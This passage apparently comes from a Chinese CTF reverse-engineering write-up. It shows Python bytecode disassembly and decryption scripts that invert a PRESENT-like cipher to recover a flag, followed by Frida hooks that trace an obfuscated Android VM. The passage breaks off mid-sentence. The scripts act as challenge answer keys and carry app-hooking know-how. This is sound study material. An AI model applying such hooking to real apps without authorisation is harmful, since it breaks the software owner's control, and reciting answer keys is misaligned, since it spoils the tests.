class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(marshal.loads(l6)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>…非常的又臭又长</p><p>解密Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">SBOX = [<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">PBOX = [</span><br><span class="line">    <span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>, <span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>, <span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>, <span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,</span><br><span class="line">    <span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>, <span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>, <span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>, <span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,</span><br><span class="line">    <span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>, <span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,</span><br><span class="line">    <span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逆表</span></span><br><span class="line">SBOX_INV = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(SBOX):</span><br><span class="line">    SBOX_INV[v] = i</span><br><span class="line"></span><br><span class="line">PBOX_INV = [<span class="number">0</span>]*<span class="number">64</span></span><br><span class="line"><span class="keyword">for</span> i, p <span class="keyword">in</span> <span class="built_in">enumerate</span>(PBOX):</span><br><span class="line">    PBOX_INV[p] = i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sbox_layer</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):  <span class="comment"># 16 个 4bit</span></span><br><span class="line">        out |= (SBOX[(x &gt;&gt; (<span class="number">4</span>*i)) &amp; <span class="number">0xF</span>] &lt;&lt; (<span class="number">4</span>*i))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sbox_inv_layer</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        out |= (SBOX_INV[(x &gt;&gt; (<span class="number">4</span>*i)) &amp; <span class="number">0xF</span>] &lt;&lt; (<span class="number">4</span>*i))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_layer</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        out |= ((x &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; PBOX[i]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_inv_layer</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        out |= ((x &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; PBOX_INV[i]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">state: <span class="built_in">int</span>, rk: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> state ^ rk</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key: <span class="built_in">int</span>, rounds: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="comment"># 每轮先取 top64 作为 roundkey，再做旋转/代换/异或注入</span></span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds + <span class="number">1</span>):</span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)  <span class="comment"># top 64 bits</span></span><br><span class="line">        key = ((key &amp; <span class="number">524287</span>) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)  <span class="comment"># 524287 = 2^19-1</span></span><br><span class="line">        top_nib = SBOX[(key &gt;&gt; <span class="number">76</span>) &amp; <span class="number">0xF</span>]</span><br><span class="line">        key = (top_nib &lt;&lt; <span class="number">76</span>) + (key &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">76</span>) - <span class="number">1</span>))</span><br><span class="line">        key ^= ((i &lt;&lt; <span class="number">15</span>) ^ (key &gt;&gt; <span class="number">19</span>))</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block_le</span>(<span class="params">cipher: <span class="built_in">int</span>, roundkeys</span>):</span><br><span class="line">    <span class="comment"># 最后一轮仅 ARK，所以先去掉最后一轮 ARK</span></span><br><span class="line">    state = add_round_key(cipher, roundkeys[-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 反向：P^-1 -&gt; S^-1 -&gt; ARK</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(roundkeys) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        state = p_inv_layer(state)</span><br><span class="line">        state = sbox_inv_layer(state)</span><br><span class="line">        state = add_round_key(state, roundkeys[i])</span><br><span class="line">    <span class="comment"># 题目里 string2number 是小端拼 64bit，这里按小端还原回字节</span></span><br><span class="line">    <span class="keyword">return</span> state.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ROUNDS = <span class="number">32</span></span><br><span class="line">    FIXED_KEY = <span class="number">85354531916197809168417</span>  <span class="comment"># 反汇编里 encrypt 使用的固定 80-bit 密钥</span></span><br><span class="line"></span><br><span class="line">    cmps = [</span><br><span class="line">        <span class="number">120617461261311902</span>,</span><br><span class="line">        <span class="number">16357837616839286114</span>,</span><br><span class="line">        <span class="number">312508749794633008</span>,</span><br><span class="line">        <span class="number">1843701600916795272</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    roundkeys = generateRoundkeys80(FIXED_KEY, ROUNDS)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐块解密并拼接</span></span><br><span class="line">    blocks = [decrypt_block_le(c, roundkeys) <span class="keyword">for</span> c <span class="keyword">in</span> cmps]</span><br><span class="line">    flag_bytes = <span class="string">b&#x27;&#x27;</span>.join(blocks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag = flag_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">        flag = flag_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">Sbox = [<span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">Sbox_inv = [Sbox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">PBox = [</span><br><span class="line">    <span class="number">0</span>, <span class="number">16</span>, <span class="number">32</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">17</span>, <span class="number">33</span>, <span class="number">49</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">34</span>, <span class="number">50</span>, <span class="number">3</span>, <span class="number">19</span>, <span class="number">35</span>, <span class="number">51</span>,</span><br><span class="line">    <span class="number">4</span>, <span class="number">20</span>, <span class="number">36</span>, <span class="number">52</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">53</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">38</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">39</span>, <span class="number">55</span>,</span><br><span class="line">    <span class="number">8</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">56</span>, <span class="number">9</span>, <span class="number">25</span>, <span class="number">41</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">43</span>, <span class="number">59</span>,</span><br><span class="line">    <span class="number">12</span>, <span class="number">28</span>, <span class="number">44</span>, <span class="number">60</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">45</span>, <span class="number">61</span>, <span class="number">14</span>, <span class="number">30</span>, <span class="number">46</span>, <span class="number">62</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">63</span></span><br><span class="line">]</span><br><span class="line">PBox_inv = [PBox.index(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addRoundKey</span>(<span class="params">state, roundkey</span>):</span><br><span class="line">    <span class="keyword">return</span> state ^ roundkey</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateRoundkeys80</span>(<span class="params">key, rounds</span>):</span><br><span class="line">    roundkeys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, rounds + <span class="number">1</span>):</span><br><span class="line">        roundkeys.append(key &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        key = ((key &amp; <span class="number">524287</span>) &lt;&lt; <span class="number">61</span>) + (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">        key = (Sbox[key &gt;&gt; <span class="number">76</span>] &lt;&lt; <span class="number">76</span>) + (key &amp; ((<span class="number">2</span> ** <span class="number">76</span>) - <span class="number">1</span>))</span><br><span class="line">        key ^= (i &lt;&lt; <span class="number">15</span>) ^ (key &gt;&gt; <span class="number">19</span>)</span><br><span class="line">    <span class="keyword">return</span> roundkeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sBoxLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        output += Sbox_inv[(state &gt;&gt; (i * <span class="number">4</span>)) &amp; <span class="number">15</span>] &lt;&lt; (i * <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_pLayer</span>(<span class="params">state</span>):</span><br><span class="line">    output = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        output += ((state &gt;&gt; i) &amp; <span class="number">1</span>) &lt;&lt; PBox_inv[i]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">number2string</span>(<span class="params">n</span>):</span><br><span class="line">    chars = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        chars.append(<span class="built_in">chr</span>((n &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphers</span>):</span><br><span class="line">    rounds = <span class="number">32</span></span><br><span class="line">    roundkeys = generateRoundkeys80(<span class="number">85354531916197809168417</span>, rounds)</span><br><span class="line">    out = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">        state = cipher</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            state = addRoundKey(state, roundkeys[i])</span><br><span class="line">            state = inv_pLayer(state)</span><br><span class="line">            state = inv_sBoxLayer(state)</span><br><span class="line"></span><br><span class="line">        block = addRoundKey(state, roundkeys[<span class="number">0</span>])</span><br><span class="line">        out.append(number2string(block))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmps = [<span class="number">120617461261311902</span>, <span class="number">16357837616839286114</span>, <span class="number">312508749794633008</span>, <span class="number">1843701600916795272</span>]</span><br><span class="line"></span><br><span class="line">decrypted_flag = decrypt(cmps)</span><br><span class="line"><span class="built_in">print</span>(decrypted_flag)</span><br></pre></td></tr></table></figure><h2 id="vm-flutter"><a href="#vm-flutter" class="headerlink" title="vm_flutter"></a>vm_flutter</h2><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251002232051888.png" alt="image-20251002232051888"></p><p>flutter然后java层打开发现了类似虚拟机的东西</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251002232613685.png" alt="image-20251002232613685"></p><p>有类似密文的东西</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251002232409580.png" alt="image-20251002232409580"></p><p>这里可以看到是比如S(来自dex)，他是因为反编译器有多个S方法所以改成了m1944S，我们要进行hook，要对这个原来的方法进行hook，而dex本来就是被混淆过的，但是不影响我们hook</p><p><strong>在 Frida 里要 hook 的是真实 dex 里的方法名 <code>h</code>，不是 jadx 生成的 <code>m1037h</code>。</strong></p><p>如果觉得反混淆难看直接关了就行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> C0434b = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;k.b&quot;</span>);</span><br><span class="line">C0434b[<span class="string">&quot;a&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;a is called&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> ret = <span class="variable language_">this</span>.<span class="title function_">a</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;a ret value is &#x27;</span> + ret);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>好久没做安卓逆向的frida题了命令都快忘了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -u -a 是 Frida 工具中的一个命令，用于列出通过 USB 连接的设备上所有运行的进程，并显示详细信息。</span><br></pre></td></tr></table></figure><p>hook一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> activity = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;k.b&quot;</span>);</span><br><span class="line">        activity.<span class="property">a</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Lshift&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">b</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Rshift&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">c</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">d</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;and&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">e</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;load &quot;</span>+x);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">f</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mul&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">g</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;or&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">h</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pop&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">i</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;push &quot;</span>+x);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">j</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;store &quot;</span>+x);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">k</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;sub&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        activity.<span class="property">l</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;xor&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(hook,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><blockquote><p><strong>只打印、不执行原逻辑</strong>：把 <code>k.b</code> 的方法全部拦截后没有调用原始实现（没 <code>orig.apply(...)</code>），所以 VM 不会真正 push&#x2F;pop&#x2F;load&#x2F;store，最终 <code>f741b</code> 